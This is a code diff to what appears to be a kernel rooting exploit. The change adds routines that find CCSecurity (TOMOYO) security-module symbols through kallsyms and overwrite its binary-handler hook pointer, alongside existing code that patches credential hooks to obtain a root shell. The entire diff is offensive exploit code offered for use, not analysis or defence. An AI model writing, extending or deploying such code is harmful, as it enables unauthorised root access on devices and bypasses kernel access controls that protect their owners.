@@ -79,6 +79,28 @@ static void *cap_bprm_set_creds = NULL;
 static void *original_bprm_set_creds = NULL;
 static void **security_ops_bprm_set_creds = NULL;
 
+static void *search_binary_handler = NULL;
+static void *ccsecurity_ops = NULL;
+static unsigned long int *ccs_search_binary_handlers = NULL;
+
+static void *
+get_ccs_search_binary_handler(unsigned long int *address, unsigned long int *ccs_search_binary_handlers)
+{
+  int i = 0;
+  int j = 0;
+
+  while (ccs_search_binary_handlers[i]) {
+    int j;
+    for (j = 0; j < 0x100; j++) {
+      if (address[j] == ccs_search_binary_handlers[i]) {
+        return address + j;
+      }
+    }
+    i++;
+  }
+  return NULL;
+}
+
 static void *
 get_security_ops_bprm_set_creds(void *address)
 {
@@ -118,6 +140,14 @@ obtain_root_privilege(void)
     if (*security_ops_bprm_set_creds != cap_bprm_set_creds) {
       original_bprm_set_creds = *security_ops_bprm_set_creds;
       *security_ops_bprm_set_creds = cap_bprm_set_creds;
+    }
+  }
+
+  if (ccsecurity_ops && search_binary_handler && ccs_search_binary_handlers) {
+    int **ccs_search_binary_handler;
+    ccs_search_binary_handler = get_ccs_search_binary_handler(ccsecurity_ops, ccs_search_binary_handlers);
+    if (ccs_search_binary_handler && *ccs_search_binary_handler != search_binary_handler) {
+      *ccs_search_binary_handler = search_binary_handler;
     }
   }
 
@@ -432,7 +462,7 @@ run_exploit(int offset)
 }
 
 static bool
-setup_cred_functions(int offset)
+setup_kernel_functions(int offset)
 {
   void *kernel;
 
@@ -447,6 +477,10 @@ setup_cred_functions(int offset)
     prepare_kernel_cred = (void*)kallsyms_in_memory_lookup_name("prepare_kernel_cred");
     security_bprm_set_creds = (void*)kallsyms_in_memory_lookup_name("security_bprm_set_creds");
     cap_bprm_set_creds = (void*)kallsyms_in_memory_lookup_name("cap_bprm_set_creds");
+
+    search_binary_handler = (void*)kallsyms_in_memory_lookup_name("search_binary_handler");
+    ccsecurity_ops = (void*)kallsyms_in_memory_lookup_name("ccsecurity_ops");
+    ccs_search_binary_handlers = kallsyms_in_memory_lookup_names("__ccs_search_binary_handler");
   }
   free(kernel);
 
@@ -456,7 +490,7 @@ setup_cred_functions(int offset)
 static int
 run_root_shell(int offset)
 {
-  if (!setup_cred_functions(offset)) {
+  if (!setup_kernel_functions(offset)) {
     return -EFAULT;
   }
 
